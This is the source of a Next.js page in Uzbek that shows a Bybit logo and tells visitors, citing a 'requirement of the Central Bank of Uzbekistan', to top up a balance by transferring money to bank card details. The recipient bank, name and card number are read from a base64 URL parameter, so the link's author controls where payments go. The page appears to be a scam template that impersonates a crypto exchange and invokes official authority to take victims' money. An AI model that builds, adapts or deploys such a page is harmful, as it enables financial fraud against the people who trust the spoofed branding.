'use client';

import React, { Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { DocumentDuplicateIcon } from '@heroicons/react/24/outline';

function PageContent() {
  const searchParams = useSearchParams();
  const encoded = searchParams.get('data');

  let values = {
    bankName: '',
    receiver: '',
    cardNumber: '',
  };

  try {
    if (encoded) {
      const decoded = atob(encoded);
      console.log(decoded);
      const parsed = JSON.parse(decoded);
      values = {
        bankName: parsed.bankName || '',
        receiver: parsed.receiver || '',
        cardNumber: parsed.cardNumber || '',
      };
    }
  } catch (err) {
    console.error('Invalid Base64 or JSON:', err);
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <main className="min-h-screen min-w-[350px] bg-black flex items-center justify-center px-4 py-10 font-bybit">
      <div className="bg-black shadow-lg rounded-xl w-full max-w-2xl border-2 border-[#ff9900]">

        <div className="flex justify-center pt-8">
          <img src="/bybit-logo.jpg" alt="O'zbekiston gerbi" className="h-20 rounded-full" />
        </div>

        <div className="text-center space-y-1 px-8">
          <h1 className="text-3xl font-bold text-white">Popolneniye balansi</h1>
        </div>

        <section className="bg-[#111111] border-2 border-[#ff9900] rounded-lg mx-8 mt-8 p-6 space-y-3 text-center">
          <h3 className="text-xl font-semibold text-white">O'zbekiston Markaziy Bankining talabi</h3>
          <p className="text-[#999999]">Balansni to'ldirish uchun quyidagi rekvizitlarga pul o'tkazing:</p>
          <p className="text-white font-bold">Mablag'lar 2 ish soati ichida hisobingizga tushadi</p>
        </section>

        <section className="bg-[#111111] border-2 border-[#ff9900] rounded-lg m-8 overflow-hidden">
          <div className="bg-[#ff9900] w-full text-black text-xl font-semibold text-center py-3">
            Balansni to'ldirish uchun rekvizitlar
          </div>

          <div className="p-6 space-y-4">
            {[
              { label: "Bank nomi", value: values.bankName },
              { label: "Oluvchi", value: values.receiver },
              { label: "Karta raqami", value: values.cardNumber },
            ].map(({ label, value }) => (
              <div key={label}>
                <label className="block text-sm text-[#999999] mb-1">{label}:</label>
                <div className="relative">
                  <input
                    type="text"
                    value={value}
                    readOnly
                    className="w-full px-3 py-2 pr-10 border-2 border-[#444] rounded-md bg-black text-white focus:outline-none focus:ring-2 focus:ring-[#ff9900]"
                  />
                  <button
                    onClick={() => handleCopy(value)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-[#ff9900] hover:text-white cursor-pointer group"
                    aria-label={`Copy ${label}`}
                  >
                    <DocumentDuplicateIcon className="h-5 w-5" />
                    <span className="absolute bottom-full mb-1 left-1/2 -translate-x-1/2 text-xs text-white bg-[#333] px-2 py-1 rounded opacity-0 group-hover:opacity-100 transition-opacity">
                      Nusxalash
                    </span>
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>
      </div>
    </main>
  );
}

export default function Page() {
  return (
    <Suspense fallback={null}>
      <PageContent />
    </Suspense>
  );
}